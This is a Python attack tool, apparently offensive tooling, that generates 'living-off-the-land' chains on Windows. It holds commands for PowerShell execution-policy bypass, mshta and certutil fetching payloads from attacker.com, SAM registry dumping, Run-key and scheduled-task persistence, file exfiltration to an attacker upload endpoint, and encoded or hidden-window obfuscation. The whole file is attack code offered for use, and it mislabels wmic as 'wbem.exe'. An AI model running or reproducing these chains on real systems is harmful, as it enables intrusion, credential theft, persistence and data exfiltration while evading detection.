#!/usr/bin/env python3
"""
LOLBIN Orchestrator
Living-off-the-land chains, execution policy bypass,
unsigned binary proxies, detection evasion, native tool abuse.
"""

import subprocess
import json
import requests
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional
from enum import Enum


class LOLBINCategory(Enum):
    """LOLBIN capability categories."""
    FILE_TRANSFER = "file_transfer"
    EXECUTION = "execution"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PERSISTENCE = "persistence"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_DUMPING = "credential_dumping"
    EXFILTRATION = "exfiltration"


@dataclass
class LOLBIN:
    """Living-off-the-land binary."""
    name: str
    path: str
    operating_system: str  # windows, linux, macos
    category: LOLBINCategory
    capabilities: List[str]
    detection_difficulty: str  # easy, moderate, difficult
    privileges_required: str  # user, administrator, system
    command_syntax: str
    detection_evasion: List[str] = field(default_factory=list)


@dataclass
class LOLBINChain:
    """Chain of LOLBIN commands."""
    chain_id: str
    objective: str
    binaries_used: List[str]
    commands: List[str]
    success_probability: float
    detection_risk: str  # low, medium, high


class LOLBASDatabase:
    """LOLBAS database integration."""
    
    @staticmethod
    def fetch_lolbas() -> List[Dict]:
        """Fetch LOLBAS entries from github."""
        try:
            url = "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/LOLBAS.json"
            
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            return []
        except Exception:
            return []
    
    @staticmethod
    def query_lolbas_by_capability(capability: str) -> List[LOLBIN]:
        """Query LOLBAS for binaries with specific capability."""
        
        binaries = []
        
        # Local LOLBIN database
        local_db = {
            "execution": [
                LOLBIN(
                    name="powershell.exe",
                    path="C:\\Windows\\System32\\powershell.exe",
                    operating_system="windows",
                    category=LOLBINCategory.EXECUTION,
                    capabilities=["script_execution", "command_execution", "file_transfer"],
                    detection_difficulty="easy",
                    privileges_required="user",
                    command_syntax="powershell.exe -ExecutionPolicy Bypass -Command",
                    detection_evasion=["encoded_commands", "hidden_window", "obfuscated_script"],
                ),
                LOLBIN(
                    name="cmd.exe",
                    path="C:\\Windows\\System32\\cmd.exe",
                    operating_system="windows",
                    category=LOLBINCategory.EXECUTION,
                    capabilities=["command_execution", "persistence"],
                    detection_difficulty="easy",
                    privileges_required="user",
                    command_syntax="cmd.exe /c",
                ),
                LOLBIN(
                    name="mshta.exe",
                    path="C:\\Windows\\System32\\mshta.exe",
                    operating_system="windows",
                    category=LOLBINCategory.EXECUTION,
                    capabilities=["script_execution", "html_application"],
                    detection_difficulty="moderate",
                    privileges_required="user",
                    command_syntax="mshta.exe http://attacker.com/payload.hta",
                ),
                LOLBIN(
                    name="cscript.exe",
                    path="C:\\Windows\\System32\\cscript.exe",
                    operating_system="windows",
                    category=LOLBINCategory.EXECUTION,
                    capabilities=["vbscript_execution", "script_execution"],
                    detection_difficulty="moderate",
                    privileges_required="user",
                    command_syntax="cscript.exe payload.vbs",
                ),
                LOLBIN(
                    name="regsvcs.exe",
                    path="C:\\Windows\\Microsoft.NET\\Framework\\regsvcs.exe",
                    operating_system="windows",
                    category=LOLBINCategory.EXECUTION,
                    capabilities=["assembly_execution", "code_execution"],
                    detection_difficulty="difficult",
                    privileges_required="user",
                    command_syntax="regsvcs.exe malicious.dll",
                ),
            ],
            "credential_dumping": [
                LOLBIN(
                    name="reg.exe",
                    path="C:\\Windows\\System32\\reg.exe",
                    operating_system="windows",
                    category=LOLBINCategory.CREDENTIAL_DUMPING,
                    capabilities=["registry_read", "sam_dumping"],
                    detection_difficulty="easy",
                    privileges_required="administrator",
                    command_syntax="reg save HKLM\\SAM sam.hive",
                ),
                LOLBIN(
                    name="wbem.exe",
                    path="C:\\Windows\\System32\\wbem\\wmic.exe",
                    operating_system="windows",
                    category=LOLBINCategory.CREDENTIAL_DUMPING,
                    capabilities=["process_execution", "system_information"],
                    detection_difficulty="moderate",
                    privileges_required="user",
                    command_syntax="wmic process call create",
                ),
            ],
            "file_transfer": [
                LOLBIN(
                    name="certutil.exe",
                    path="C:\\Windows\\System32\\certutil.exe",
                    operating_system="windows",
                    category=LOLBINCategory.FILE_TRANSFER,
                    capabilities=["file_download", "file_upload", "url_download"],
                    detection_difficulty="moderate",
                    privileges_required="user",
                    command_syntax="certutil.exe -urlcache -split -f http://attacker.com/file.exe",
                ),
                LOLBIN(
                    name="bitsadmin.exe",
                    path="C:\\Windows\\System32\\bitsadmin.exe",
                    operating_system="windows",
                    category=LOLBINCategory.FILE_TRANSFER,
                    capabilities=["file_download", "background_transfer"],
                    detection_difficulty="moderate",
                    privileges_required="user",
                    command_syntax="bitsadmin /transfer job /download /resume",
                ),
            ],
        }
        
        for cat, bins in local_db.items():
            if cat.lower() in capability.lower() or capability.lower() in cat:
                binaries.extend(bins)
        
        return binaries


class LOLBINChainGenerator:
    """Generate LOLBIN chains for objectives."""
    
    @staticmethod
    def generate_execution_chain(
        payload: str,
        avoid_detection: bool = True,
    ) -> LOLBINChain:
        """Generate chain to execute payload."""
        
        # Start with indirect execution
        commands = []
        binaries = []
        
        if avoid_detection:
            # Use multiple obfuscation layers
            commands.append("powershell.exe -NoProfile -ExecutionPolicy Bypass -Encoded <base64_payload>")
            binaries.append("powershell.exe")
            binaries.append("cmd.exe")
        else:
            commands.append(f"powershell.exe -Command {payload}")
            binaries.append("powershell.exe")
        
        chain = LOLBINChain(
            chain_id=f"exec-{datetime.now().timestamp()}",
            objective="Execute arbitrary code",
            binaries_used=binaries,
            commands=commands,
            success_probability=0.95,
            detection_risk="medium" if avoid_detection else "high",
        )
        
        return chain
    
    @staticmethod
    def generate_persistence_chain() -> LOLBINChain:
        """Generate chain for persistence."""
        
        commands = [
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d powershell.exe",
            "schtasks /create /tn UpdateTask /tr \"powershell.exe -Command ...\" /sc daily /st 09:00",
        ]
        
        binaries = ["reg.exe", "schtasks.exe"]
        
        chain = LOLBINChain(
            chain_id=f"persist-{datetime.now().timestamp()}",
            objective="Establish persistence",
            binaries_used=binaries,
            commands=commands,
            success_probability=0.85,
            detection_risk="medium",
        )
        
        return chain
    
    @staticmethod
    def generate_exfiltration_chain(
        data_path: str,
        exfil_endpoint: str,
    ) -> LOLBINChain:
        """Generate chain to exfiltrate data."""
        
        commands = [
            f"certutil.exe -urlcache -split -f file:///{data_path} C:\\temp\\data.tmp",
            f"powershell.exe -Command (New-Object Net.WebClient).UploadFile('{exfil_endpoint}', 'C:\\temp\\data.tmp')",
        ]
        
        binaries = ["certutil.exe", "powershell.exe"]
        
        chain = LOLBINChain(
            chain_id=f"exfil-{datetime.now().timestamp()}",
            objective="Exfiltrate sensitive data",
            binaries_used=binaries,
            commands=commands,
            success_probability=0.80,
            detection_risk="high",
        )
        
        return chain


class ExecutionPolicyBypass:
    """PowerShell execution policy bypass techniques."""
    
    @staticmethod
    def bypass_execution_policy(script_content: str) -> str:
        """Generate bypass for PowerShell execution policy."""
        
        # Multiple bypass methods
        bypasses = [
            f"powershell.exe -ExecutionPolicy Bypass -Command \"{script_content}\"",
            f"powershell.exe -ExecutionPolicy Unrestricted -Command \"{script_content}\"",
            f"powershell.exe -NoProfile -Command \"{script_content}\"",
            f"powershell.exe -Command \"& {{Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; {script_content}}}\"",
            f"cmd.exe /c \"powershell.exe -Command \"{script_content}\"\"",
        ]
        
        return bypasses[0]  # Return most reliable


class DetectionEvasion:
    """LOLBIN-based detection evasion."""
    
    @staticmethod
    def obfuscate_powershell_command(command: str) -> str:
        """Obfuscate PowerShell command."""
        
        import base64
        
        # Encode payload
        encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
        
        return f"powershell.exe -EncodedCommand {encoded}"
    
    @staticmethod
    def hide_window_execution(command: str) -> str:
        """Execute command with hidden window."""
        
        # Use wscript for hidden execution
        return f"wscript.exe //nologo //b \"{command}\""
    
    @staticmethod
    def use_unsigned_binary(command: str) -> str:
        """Proxy execution through unsigned binary."""
        
        # Use MSHTA for execution
        return f"mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"{command}\",0)(window.close)"


class LOLBINOrchestrator:
    """Main orchestrator for LOLBIN attacks."""
    
    def __init__(self):
        self.chains: List[LOLBINChain] = []
        self.available_binaries: List[LOLBIN] = []
    
    def assess_available_binaries(self) -> Dict:
        """Assess available LOLBIN on system."""
        
        assessment = {
            "execution_available": False,
            "persistence_available": False,
            "exfiltration_available": False,
            "credential_dumping_available": False,
        }
        
        # Check for execution LOLBINs
        exec_bins = LOLBASDatabase.query_lolbas_by_capability("execution")
        if exec_bins:
            assessment["execution_available"] = True
        
        # Check for persistence
        persist_bins = LOLBASDatabase.query_lolbas_by_capability("persistence")
        if persist_bins:
            assessment["persistence_available"] = True
        
        # Check for exfiltration
        exfil_bins = LOLBASDatabase.query_lolbas_by_capability("file_transfer")
        if exfil_bins:
            assessment["exfiltration_available"] = True
        
        # Check for credential dumping
        cred_bins = LOLBASDatabase.query_lolbas_by_capability("credential_dumping")
        if cred_bins:
            assessment["credential_dumping_available"] = True
        
        return assessment
    
    def build_attack_chain(self, objective: str) -> Optional[LOLBINChain]:
        """Build LOLBIN chain for objective."""
        
        if "execute" in objective.lower():
            chain = LOLBINChainGenerator.generate_execution_chain("whoami")
        elif "persist" in objective.lower():
            chain = LOLBINChainGenerator.generate_persistence_chain()
        elif "exfil" in objective.lower():
            chain = LOLBINChainGenerator.generate_exfiltration_chain(
                "C:\\Users\\user\\Documents",
                "http://attacker.com/upload"
            )
        else:
            return None
        
        self.chains.append(chain)
        return chain
    
    def export_chains_json(self) -> str:
        """Export LOLBIN chains as JSON."""
        return json.dumps([asdict(c) for c in self.chains], indent=2, default=str)


from datetime import datetime

def main():
    """Demo: LOLBIN orchestration."""
    
    orchestrator = LOLBINOrchestrator()
    
    # Assess available binaries
    assessment = orchestrator.assess_available_binaries()
    
    print("[+] LOLBIN Assessment")
    for capability, available in assessment.items():
        print(f"    {capability}: {'Available' if available else 'Not available'}")
    
    # Build chains
    exec_chain = orchestrator.build_attack_chain("execute payload")
    persist_chain = orchestrator.build_attack_chain("establish persistence")
    
    print(f"\n[+] LOLBIN Chains Generated: {len(orchestrator.chains)}")
    for chain in orchestrator.chains:
        print(f"    {chain.objective}: {', '.join(chain.binaries_used)}")


if __name__ == '__main__':
    main()
